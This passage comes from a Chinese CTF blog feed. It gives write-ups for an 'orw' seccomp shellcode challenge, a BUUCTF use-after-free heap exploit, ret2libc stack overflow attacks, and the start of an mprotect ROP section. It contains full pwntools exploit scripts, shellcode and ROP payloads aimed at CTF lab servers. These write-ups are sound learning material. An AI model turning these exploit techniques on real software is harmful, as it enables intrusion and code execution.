alt="image-20211117203205447"></p><p>本题系统内核只允许使用 sys_open，sys_read，sys_write</p><p>第一次调用 prctl 函数 禁止提权，第二次调用 prctl 函数 限制能执行的系统调用只有 open，write，exit</p><p>总体思路是：open flag -&gt;read-&gt;write</p><ol><li>sys_open</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">push <span class="number">0x0</span>  <span class="comment">#字符串结尾</span></span><br><span class="line">push <span class="number">0x67616c66</span><span class="comment">#&#x27;flags&#x27;</span></span><br><span class="line">mov ebx,esp</span><br><span class="line">xor ecx,ecx<span class="comment">#0</span></span><br><span class="line">xor edx,edx<span class="comment">#0</span></span><br><span class="line">mov eax,<span class="number">0x5</span><span class="comment">#调用号</span></span><br><span class="line"><span class="built_in">int</span> <span class="number">0x80</span><span class="comment">#sys_open(flags,0,0)</span></span><br></pre></td></tr></table></figure><ol start="2"><li><p>sys_read (2,file,0x100) 系统调用号为 3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov eax,<span class="number">0x3</span>; </span><br><span class="line">mov ecx,ebx;<span class="comment"># ecx = char __user *buf 缓冲区，读出的数据--&gt;也就是读“flag”</span></span><br><span class="line">mov ebx,<span class="number">0x3</span>;<span class="comment"># 文件描述符 fd:是文件描述符 0 1 2 3 代表标准的输出输入和出错,其他打开的文件</span></span><br><span class="line">mov edx,<span class="number">0x100</span>;<span class="comment">#对应字节数</span></span><br><span class="line"><span class="built_in">int</span> <span class="number">0x80</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>sys_write (1,file,0x30) 系统调用号为 4</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax,<span class="number">0x4</span>;<span class="comment"># eax = sys_write</span></span><br><span class="line">mov ebx,<span class="number">0x1</span>;<span class="comment"># ebx = unsigned int fd = 1</span></span><br><span class="line"><span class="built_in">int</span> <span class="number">0x80</span>;</span><br></pre></td></tr></table></figure><p>exp:</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn  <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28836</span>)</span><br><span class="line">shellcode=<span class="string">&quot;&quot;</span></span><br><span class="line">shellcode += asm(<span class="string">&#x27;xor ecx,ecx;mov eax,0x5; push ecx;push 0x67616c66; mov ebx,esp;xor edx,edx;int 0x80;&#x27;</span>)</span><br><span class="line">shellcode += asm(<span class="string">&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80;&#x27;</span>)</span><br><span class="line">shellcode += asm(<span class="string">&#x27;mov eax,0x4;mov bl,0x1;mov edx,0x30;int 0x80;&#x27;</span>)</span><br><span class="line">recv = p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">flag = p.recv(<span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28836</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;orw&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwnable.tw </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>堆漏洞uaf</title>
      <link href="/2021/11/17/hitcontraining_uaf/"/>
      <url>/2021/11/17/hitcontraining_uaf/</url>
      
        <content type="html"><![CDATA[<p>uaf</p><span id="more"></span><h2 id="知识点"><a class="markdownIt-Anchor" href="#知识点">#</a> 知识点</h2><p>UAF 漏洞全称为 use after free，即释放后重用。漏洞产生的原因，在于内存在被释放后，但是指向指针并没有被删除，又被程序调用。比较常见的类型是 C<ins> 对象，利用 UAF 修改 C</ins> 的虚函数表导致的任意代码执行。</p><h2 id="例题"><a class="markdownIt-Anchor" href="#例题">#</a> 例题</h2><h3 id="buuctfpwnhitcontraining_uaf"><a class="markdownIt-Anchor" href="#buuctfpwnhitcontraining_uaf">#</a> [BUUCTF]PWN——hitcontraining_uaf</h3><ol><li>checksec 检查，开了 NX 保护，32 位</li></ol><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171548682.png" alt="image-20211117154838315"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171549415.png" alt="image-20211117154930218"></p><p>(1) add note</p><p><img src="https://img-blog.csdnimg.cn/20210602182659998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTU1NjQ0MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>add 会申请两次内存，第一次申请 8 个字节，前四个字节指向 print_note_content 这个函数，后四个字节指向我们写入的字符串 (count 会加 1)</p><p>(2) delete note</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171557904.png" alt="image-20211117155714676"></p><p>只释放了堆块里的内容但没有将指针置 0，存在 uaf 漏洞，并未指向 NULL</p><p>(3)  print note</p><p><img src="https://img-blog.csdnimg.cn/2020090722450461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>调用 add 申请的第一个 8 个字节中的前四个字节指向的函数，打印 add 创建的第二个 chunk 里的值</p><p><img src="https://img-blog.csdnimg.cn/20200907225210334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（4） shell</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171626096.png" alt="image-20211117162634035"></p><p>fastbin 是单向链表遵循先进后出原则，申请 A,B 两个堆块后，先释放 A ，后释放 B，会在 fastbin 里形成链，此时，再次申请一个大小为 0x8 的内存 C，并写入 shellcode 地址，那么第一个 8 个字节 C 就指向 B，第二个 8 个字节 C 指向 A，这时候我们写入的内容就会覆盖原有的，但原来的指针仍指向它，因而可以更改 print_note_content 函数为我们想要执行的函数。</p><p>在 add 中，我们只能对 content 部分进行操作，无法对 print_note_content 对应的部分即 put 段进行操作，所以我们要想办法，操作 put 段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">根据put段和content段中大小的不同，如果要申请到put段，payload大小应该为0x8，由于先进后出原则，先释放A，后释放B，此时第三次申请的put段指向B的put，content段指向A的put，content写入magic，调用print_note(0)时就调用了magic</span><br></pre></td></tr></table></figure><p>申请过程堆块变化：<br>add:</p><p><img src="https://img-blog.csdnimg.cn/2020090723023881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>free 后：<br><img src="https://img-blog.csdnimg.cn/20200907230643335.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>再次申请，写入 shell<br><img src="https://img-blog.csdnimg.cn/20200907231047979.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>先进后出原则</p><p>wp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"><span class="comment"># r = remote(&#x27;node4.buuoj.cn&#x27;,27609)</span></span><br><span class="line">shell_add = <span class="number">0x8048945</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">  r.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">&#x27;Note size :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">  r.sendlineafter(<span class="string">&#x27;Content :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">  r.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printf</span>(<span class="params">idx</span>):</span><br><span class="line">  r.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">48</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">48</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,p32(shell_add))</span><br><span class="line">printf(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二种思路double free</span></span><br><span class="line"><span class="comment">#add(8,&#x27;aaaa&#x27;)</span></span><br><span class="line"><span class="comment">#delete(0)</span></span><br><span class="line"><span class="comment">#delete(0)</span></span><br><span class="line"><span class="comment">#add(40,&#x27;aaaa&#x27;)</span></span><br><span class="line"><span class="comment">#add(8,p32(shell_addr))</span></span><br><span class="line"><span class="comment">#printf(1)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章">#</a> 参考文章</h2><p><a href="https://blog.csdn.net/mcmuyanga/article/details/108454183?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163714805316780261940769%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163714805316780261940769&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2">https://blog.csdn.net/mcmuyanga/article/details/108454183?ops_request_misc=%7B%22request%5Fid%22%3A%22163714805316780261940769%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=163714805316780261940769&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2</a><sub>all</sub>sobaiduend~default-2-108454183.first_rank_v2_pc_rank_v29&amp;utm_term=hitcontraining_uaf&amp;spm=1018.2226.3001.4187</p><p><a href="https://www.anquanke.com/post/id/190589">IE 漏洞学习笔记（二）：UAF 释放后重用</a></p><p><a href="https://www.anquanke.com/post/id/176694">One_gadget 和 UAF 结合利用堆溢出漏洞研究</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出</title>
      <link href="/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
      <url>/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<p>ret2libc，fmtstr</p><span id="more"></span><h2 id="一-基础知识补充"><a class="markdownIt-Anchor" href="#一-基础知识补充">#</a> 一。基础知识补充</h2><ol><li><p>指令指针寄存器，是存放下次将要执行的指令在代码段的偏移量，RIP、EIP、IP (Instruction Pointer) 分别为 64 位、32 位、16 位指令指针寄存器</p></li><li><p>以 64 位程序为例:</p><p>在执行 call 指令的时候，会向栈中压入 call 指令完成后下一条指令的地址，之后跳转到被调用的函数开始执行</p><p>push rbp ; 将父函数栈底压入栈中<br>mov rbp, rsp ; 将父函数栈顶变为子函数栈底<br>sub rsp, 0x70 ; 向低地址处为子函数开辟栈帧</p><p>在函数调用结束的时候，程序会执行这两条指令<br>leave 指令相当于执行了如下两条指令<br>mov esp ebp<br>pop ebp</p><p>ret 指令则可以理解为将栈中的返回地址 pop 给 rip 的操作，从而回到父函数继续执行</p></li></ol><h2 id="二-ret2text"><a class="markdownIt-Anchor" href="#二-ret2text">#</a> 二. ret2text</h2><p>栈溢出函数：strcpy</p><p>程序本身存在 fflush 函数，我们可以直接用它的 sh 来当作 system 的参数</p><h2 id="三-ret2libc"><a class="markdownIt-Anchor" href="#三-ret2libc">#</a> 三. ret2libc</h2><h3 id="泄露libc利用思路"><a class="markdownIt-Anchor" href="#泄露libc利用思路">#</a> 泄露 libc 利用思路：</h3><ol><li>利用 write 函数来泄露程序的 libc 版本</li><li>知道 libc 版本后去计算程序里的 system 函数和字符串 “/bin/sh” 的地址</li><li>覆盖返回地址为 system（‘/bin/sh’），获取 shell</li></ol><h3 id="例题2018_rop"><a class="markdownIt-Anchor" href="#例题2018_rop">#</a> 例题：2018_rop</h3><p><img src="https://img-blog.csdnimg.cn/20201006145006742.png#pic_center" alt="在这里插入图片描述"></p><p><code>1:</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">0</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>)) <span class="comment"># 获取write函数地址</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先填充‘a’*（0x88+4）造成溢出，覆盖到返回地址，返回地址填上 write 函数的 plt 地址来调用 write 函数，之后跟上 main 函数地址（我们要将程序程序重新执行一遍，再次利用输入点来进构造 rop）<br>p32（0）+p32 (write_addr)+p32 (4) 是在设置 write 函数的参数，对应函数原型看一下，32 位程序是 4 位，所以这边写的 4，对应的 64 位程序是 8 位。</p><p><code>2:</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">offset=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)     <span class="comment">#计算偏移量</span></span><br><span class="line">                                <span class="comment">#偏移量=程序里的函数地址-libc里的函数地址</span></span><br><span class="line">system_addr=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>3:</code></p><p>构造 rop 获取 shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_sh)</span><br></pre></td></tr></table></figure><p>完整 exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27043</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">0</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">offset=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_sh)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是我在这么写的时候出现了  <code>timeout: the monitored command dumped core</code> , 尝试泄露 read 函数的真实地址，再调用 read 函数来找到偏移。(后来找到问题有：payload 的顺序错误也会导致 timeout 和找不到 libc,timeout 对应 payload: 填充 + got 表 + plt 表 + main，找不到 libc 对应 payload: 填充 + pop_rdi_ret+binsh_system, 对应 64 位栈溢出，32 位和 64 位不同)</p><p>64 位查找 pop_rdi:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary bjdctf_2020_babyrop |grep <span class="string">&quot;pop rdi&quot;</span></span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&quot;./2018_rop&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28628</span>)</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x080484C6</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) </span><br><span class="line">payload += p32(write_plt) + p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(read_got) + p32(<span class="number">8</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(read_addr)</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;read&quot;</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>)</span><br><span class="line">payload += p32(sys_addr) + p32(<span class="number">0</span>) + p32(binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>LibcSearcher 使用方法：将 exp 放在 libcsearcher 的安装目录下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;25295&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./1&#x27;</span>)</span><br><span class="line">main=<span class="number">0x400b28</span></span><br><span class="line">rdi=<span class="number">0x400c83</span></span><br><span class="line">ret=<span class="number">0x4006b9</span></span><br><span class="line">pus_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()　　　　<span class="comment">#接收 encrypt  的两个 puts函数输出;</span></span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))  <span class="comment">#得到 puts 函数 的地址;</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)       <span class="comment"># 得到 libc的版本;</span></span><br><span class="line">libc_base=puts_addr-libc.dump(<span class="string">&quot;puts&quot;</span>)     <span class="comment">#    得到偏移地址</span></span><br><span class="line">sys_addr=libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)     <span class="comment">#  利用偏移地址 得到 system函数的地址</span></span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)     <span class="comment">#               得到  bin/sh 的 地址</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)      <span class="comment">#   再一次执行 一遍流程</span></span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)+p64(ret)+p64(rdi)+p64(binsh)+p64(sys_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>plt 表 -》got 表</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111170953007.png" alt="image-20211117095319554"></p><h2 id="四-利用mprotect修改内存权限"><a class="markdownIt-Anchor" href="#四-利用mprotect修改内存权限">#</a> 四。利用 mprotect 修改内存权限</h2><p>mprotect 函数，可以用它来修改我们，内存栈的权限，让它可读可写可执行，进而修改内存权限。</p><h3 id="ropgadget使用"><a class="markdownIt-Anchor" href="#ropgadget使用">#</a> ROPgadget 使用</h3><p>例题：not_the_same_3dsctf_2016</p><p>利用 <code>mprotect</code>  函数修改 bss 段为 <code>0x7</code>  即 <code>0b111</code> ，可读可写可执行权限，然后利用 read 函数读入 shellcode，最后跳转到 shellcode 的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary not_the_same_3dsctf_2016--only &quot;pop|ret&quot;|grep pop</span><br></pre></td></tr></table></figure><p>需要利用 ret 指令控制程序，所以这里需要借助用来设置三个参数的三个寄存器命令，p3_ret=0x806fcc8</p><p>ctrl+s 调出程序的段表，将.got.plt 段改为可读可写可执行，addr=0x80eb000</p><p>将返回地址填写成 read 函数，设置 read 函数的参数，之后将返回地址改为我们修改为可读可写可执行的地址，最后读入 shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mprotect函数的利用，将目标地址：.got.plt或.bss段 修改为可读可写可执行</span></span><br><span class="line"><span class="built_in">int</span> 